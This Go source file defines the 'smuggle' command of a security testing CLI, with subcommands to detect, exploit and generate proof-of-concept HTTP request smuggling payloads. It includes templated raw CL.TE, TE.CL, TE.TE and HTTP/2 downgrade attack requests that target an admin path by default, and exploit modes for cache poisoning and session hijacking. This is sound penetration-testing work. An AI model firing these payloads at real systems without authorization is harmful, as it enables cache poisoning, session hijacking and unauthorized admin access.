package cmd

import (
	"context"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/CodeMonkeyCybersecurity/shells/pkg/smuggling"
	"github.com/CodeMonkeyCybersecurity/shells/pkg/types"
	"github.com/spf13/cobra"
)

// TECHNICAL DEBT: This file contains 2 remaining os.Exit(1) calls that should be replaced
// with proper error returns for better composability and testing.
// Pattern to fix: fmt.Printf("Error..."); os.Exit(1) -> return fmt.Errorf("...")
// Locations: lines ~143, ~186 (search for "os.Exit" to find exact lines)
// Priority: P1 (improves testability but not critical for users)

var smuggleCmd = &cobra.Command{
	Use:   "smuggle",
	Short: "Detect HTTP Request Smuggling vulnerabilities",
	Long: `HTTP Request Smuggling detection and exploitation tool.

This command provides comprehensive testing for HTTP Request Smuggling vulnerabilities including:
- CL.TE (Content-Length Transfer-Encoding) desync attacks
- TE.CL (Transfer-Encoding Content-Length) desync attacks  
- TE.TE (Transfer-Encoding Transfer-Encoding) desync attacks
- HTTP/2 request smuggling
- Differential response analysis
- Timing-based detection

Examples:
  shells smuggle detect https://example.com
  shells smuggle detect https://example.com --technique cl.te
  shells smuggle exploit https://example.com --technique te.cl
  shells smuggle detect https://example.com --differential --timeout 15s`,
}

var smuggleDetectCmd = &cobra.Command{
	Use:   "detect [target]",
	Short: "Detect request smuggling vulnerabilities",
	Long: `Detect HTTP Request Smuggling vulnerabilities using various techniques.

This command tests for request smuggling vulnerabilities by:
- Sending crafted HTTP requests with conflicting headers
- Analyzing response patterns and timing differences
- Testing different smuggling techniques (CL.TE, TE.CL, TE.TE, HTTP/2)
- Performing differential analysis to detect desync conditions

Examples:
  shells smuggle detect https://example.com
  shells smuggle detect https://example.com --technique cl.te
  shells smuggle detect https://example.com --technique all --differential
  shells smuggle detect https://example.com --timeout 30s --no-verify-ssl`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		target := args[0]

		// Get flags
		technique, _ := cmd.Flags().GetString("technique")
		differential, _ := cmd.Flags().GetBool("differential")
		timing, _ := cmd.Flags().GetBool("timing")
		timeout, _ := cmd.Flags().GetString("timeout")
		userAgent, _ := cmd.Flags().GetString("user-agent")
		verifySSL, _ := cmd.Flags().GetBool("verify-ssl")
		output, _ := cmd.Flags().GetString("output")
		verbose, _ := cmd.Flags().GetBool("verbose")

		// Build options
		options := map[string]string{
			"technique":    technique,
			"differential": fmt.Sprintf("%t", differential),
			"timing":       fmt.Sprintf("%t", timing),
			"timeout":      timeout,
			"user-agent":   userAgent,
			"verify-ssl":   fmt.Sprintf("%t", verifySSL),
		}

		// Create scanner
		scanner := smuggling.NewScanner()

		// Run detection
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Minute)
		defer cancel()

		findings, err := scanner.Scan(ctx, target, options)
		if err != nil {
			// TODO(P1): Convert this command to use RunE instead of Run to return errors properly
			fmt.Fprintf(os.Stderr, "Error: smuggling detection failed: %v\n", err)
			os.Exit(1)
		}

		// Output results
		if output != "" {
			outputSmugglingResults(findings, output, "json")
		} else {
			printSmugglingDetectionResults(findings, verbose)
		}
	},
}

var smuggleExploitCmd = &cobra.Command{
	Use:   "exploit [target]",
	Short: "Exploit request smuggling vulnerabilities",
	Long: `Exploit detected HTTP Request Smuggling vulnerabilities.

This command attempts to exploit request smuggling vulnerabilities by:
- Testing cache poisoning attacks
- Attempting session hijacking
- Testing administrative endpoint access
- Generating proof-of-concept payloads

Examples:
  shells smuggle exploit https://example.com --technique cl.te
  shells smuggle exploit https://example.com --technique te.cl --target-path /admin
  shells smuggle exploit https://example.com --generate-poc --output exploit.txt`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		target := args[0]

		// Get flags
		technique, _ := cmd.Flags().GetString("technique")
		targetPath, _ := cmd.Flags().GetString("target-path")
		generatePoC, _ := cmd.Flags().GetBool("generate-poc")
		timeout, _ := cmd.Flags().GetString("timeout")
		output, _ := cmd.Flags().GetString("output")
		verbose, _ := cmd.Flags().GetBool("verbose")

		// Build options
		options := map[string]string{
			"technique":    technique,
			"target-path":  targetPath,
			"generate-poc": fmt.Sprintf("%t", generatePoC),
			"timeout":      timeout,
		}

		// Create scanner first to validate
		scanner := smuggling.NewScanner()

		// Run exploitation
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
		defer cancel()

		findings, err := scanner.Scan(ctx, target, options)
		if err != nil {
			fmt.Printf("Error during smuggling exploitation: %v\n", err)
			os.Exit(1)
		}

		// Output results
		if output != "" {
			outputSmugglingResults(findings, output, "json")
		} else {
			printSmugglingExploitResults(findings, verbose)
		}
	},
}

var smugglePocCmd = &cobra.Command{
	Use:   "poc [target]",
	Short: "Generate proof-of-concept for smuggling",
	Long: `Generate proof-of-concept payloads for HTTP Request Smuggling vulnerabilities.

This command generates ready-to-use PoC payloads for:
- CL.TE desync attacks
- TE.CL desync attacks
- TE.TE desync attacks
- HTTP/2 smuggling attacks

Examples:
  shells smuggle poc https://example.com --technique cl.te
  shells smuggle poc https://example.com --technique all --output pocs.txt
  shells smuggle poc https://example.com --technique te.cl --target-path /admin`,
	Args: cobra.ExactArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		target := args[0]

		// Get flags
		technique, _ := cmd.Flags().GetString("technique")
		targetPath, _ := cmd.Flags().GetString("target-path")
		output, _ := cmd.Flags().GetString("output")

		// Generate PoCs
		pocs := generatePoCs(target, technique, targetPath)

		// Output results
		if output != "" {
			if err := os.WriteFile(output, []byte(strings.Join(pocs, "\n\n")), 0644); err != nil {
				fmt.Printf("Error writing PoCs to file: %v\n", err)
				os.Exit(1)
			}
			fmt.Printf("PoCs written to %s\n", output)
		} else {
			fmt.Printf("📝 HTTP Request Smuggling PoCs\n")
			fmt.Printf("═══════════════════════════════════\n\n")
			for _, poc := range pocs {
				fmt.Printf("%s\n\n", poc)
			}
		}
	},
}

func init() {
	rootCmd.AddCommand(smuggleCmd)

	// Add subcommands
	smuggleCmd.AddCommand(smuggleDetectCmd)
	smuggleCmd.AddCommand(smuggleExploitCmd)
	smuggleCmd.AddCommand(smugglePocCmd)

	// Global flags
	smuggleCmd.PersistentFlags().String("technique", "all", "Smuggling technique (cl.te, te.cl, te.te, http2, all)")
	smuggleCmd.PersistentFlags().String("timeout", "30s", "Request timeout")
	smuggleCmd.PersistentFlags().String("user-agent", "shells-smuggling/1.0", "User agent string")
	smuggleCmd.PersistentFlags().Bool("verify-ssl", true, "Verify SSL certificates")
	smuggleCmd.PersistentFlags().String("output", "", "Output file for results")
	smuggleCmd.PersistentFlags().BoolP("verbose", "v", false, "Verbose output")

	// Detect command flags
	smuggleDetectCmd.Flags().Bool("differential", true, "Use differential response analysis")
	smuggleDetectCmd.Flags().Bool("timing", true, "Use timing-based detection")

	// Exploit command flags
	smuggleExploitCmd.Flags().String("target-path", "/admin", "Target path for exploitation")
	smuggleExploitCmd.Flags().Bool("generate-poc", false, "Generate proof-of-concept")

	// PoC command flags
	smugglePocCmd.Flags().String("target-path", "/admin", "Target path for PoC")
}

// printSmugglingDetectionResults prints smuggling detection results
func printSmugglingDetectionResults(findings []types.Finding, verbose bool) {
	fmt.Printf("🔍 HTTP Request Smuggling Detection Results\n")
	fmt.Printf("══════════════════════════════════════════\n\n")

	if len(findings) == 0 {
		fmt.Printf("✅ No request smuggling vulnerabilities detected\n")
		return
	}

	// Group findings by technique
	techniqueGroups := make(map[string][]types.Finding)
	for _, finding := range findings {
		if technique, exists := finding.Metadata["technique"]; exists {
			techniqueStr := fmt.Sprintf("%v", technique)
			techniqueGroups[techniqueStr] = append(techniqueGroups[techniqueStr], finding)
		}
	}

	// Print results by technique
	techniques := []string{"CL.TE", "TE.CL", "TE.TE", "HTTP2"}

	for _, technique := range techniques {
		if findings, exists := techniqueGroups[technique]; exists {
			fmt.Printf("🚨 %s Technique (%d findings)\n", technique, len(findings))
			fmt.Printf("─────────────────────────────────\n")

			for _, finding := range findings {
				fmt.Printf("• %s\n", finding.Title)
				fmt.Printf("  Severity: %s\n", finding.Severity)
				fmt.Printf("  Description: %s\n", finding.Description)

				if confidence, exists := finding.Metadata["confidence"]; exists {
					fmt.Printf("  Confidence: %.2f\n", confidence)
				}

				if verbose {
					fmt.Printf("  Evidence: %s\n", finding.Evidence)
					fmt.Printf("  Solution: %s\n", finding.Solution)
				}

				fmt.Printf("\n")
			}
		}
	}

	fmt.Printf("📊 Summary: %d vulnerabilities found across %d techniques\n", len(findings), len(techniqueGroups))
}

// printSmugglingExploitResults prints smuggling exploitation results
func printSmugglingExploitResults(findings []types.Finding, verbose bool) {
	fmt.Printf("💥 HTTP Request Smuggling Exploitation Results\n")
	fmt.Printf("═══════════════════════════════════════════\n\n")

	if len(findings) == 0 {
		fmt.Printf("❌ No exploitable vulnerabilities found\n")
		return
	}

	for _, finding := range findings {
		fmt.Printf("⚠️  %s\n", finding.Title)
		fmt.Printf("   Severity: %s\n", finding.Severity)
		fmt.Printf("   Type: %s\n", finding.Type)

		if technique, exists := finding.Metadata["technique"]; exists {
			fmt.Printf("   Technique: %s\n", technique)
		}

		if impact, exists := finding.Metadata["impact"]; exists {
			fmt.Printf("   Impact: %s\n", impact)
		}

		fmt.Printf("   Description: %s\n", finding.Description)

		if verbose {
			fmt.Printf("   Evidence: %s\n", finding.Evidence)
			fmt.Printf("   Solution: %s\n", finding.Solution)

			if payload, exists := finding.Metadata["payload_used"]; exists {
				fmt.Printf("   Payload Used:\n%s\n", payload)
			}
		}

		fmt.Printf("\n")
	}
}

// outputSmugglingResults outputs smuggling results to a file
func outputSmugglingResults(findings []types.Finding, filename, format string) {
	var data []byte
	var err error

	switch format {
	case "json":
		data, err = json.MarshalIndent(findings, "", "  ")
	default:
		data, err = json.MarshalIndent(findings, "", "  ")
	}

	if err != nil {
		fmt.Printf("Error marshaling findings: %v\n", err)
		return
	}

	if err := os.WriteFile(filename, data, 0644); err != nil {
		fmt.Printf("Error writing to file: %v\n", err)
		return
	}

	fmt.Printf("Results written to %s\n", filename)
}

// generatePoCs generates proof-of-concept payloads
func generatePoCs(target, technique, targetPath string) []string {
	pocs := []string{}

	// Extract host from target
	host := target
	if strings.HasPrefix(target, "http://") {
		host = strings.TrimPrefix(target, "http://")
	} else if strings.HasPrefix(target, "https://") {
		host = strings.TrimPrefix(target, "https://")
	}

	techniques := []string{}
	if technique == "all" {
		techniques = []string{"cl.te", "te.cl", "te.te", "http2"}
	} else {
		techniques = []string{technique}
	}

	for _, tech := range techniques {
		switch tech {
		case "cl.te":
			poc := fmt.Sprintf(`# CL.TE Request Smuggling PoC
# Target: %s
# Technique: Content-Length Transfer-Encoding Desync

POST %s HTTP/1.1
Host: %s
Content-Length: 6
Transfer-Encoding: chunked

0

G

# Follow with normal request:
POST %s HTTP/1.1
Host: %s
Content-Length: 0

# Expected: The 'G' interferes with the second request`, target, targetPath, host, targetPath, host)
			pocs = append(pocs, poc)

		case "te.cl":
			poc := fmt.Sprintf(`# TE.CL Request Smuggling PoC
# Target: %s
# Technique: Transfer-Encoding Content-Length Desync

POST %s HTTP/1.1
Host: %s
Content-Length: 4
Transfer-Encoding: chunked

12
GPOST %s HTTP/1.1
Host: %s
0

# Expected: Frontend processes as chunked, backend uses Content-Length`, target, targetPath, host, targetPath, host)
			pocs = append(pocs, poc)

		case "te.te":
			poc := fmt.Sprintf(`# TE.TE Request Smuggling PoC
# Target: %s
# Technique: Transfer-Encoding Transfer-Encoding Desync

POST %s HTTP/1.1
Host: %s
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5e
GPOST %s HTTP/1.1
Host: %s
Content-Length: 15

x=1
0

# Expected: Different handling of duplicate Transfer-Encoding headers`, target, targetPath, host, targetPath, host)
			pocs = append(pocs, poc)

		case "http2":
			poc := fmt.Sprintf(`# HTTP/2 Request Smuggling PoC
# Target: %s
# Technique: HTTP/2 Downgrade Attack

POST %s HTTP/2
Host: %s
Content-Length: 0

GET %s HTTP/1.1
Host: %s
Content-Length: 10

x=1

# Expected: HTTP/2 frontend downgrades to HTTP/1.1 backend`, target, targetPath, host, targetPath, host)
			pocs = append(pocs, poc)
		}
	}

	return pocs
}
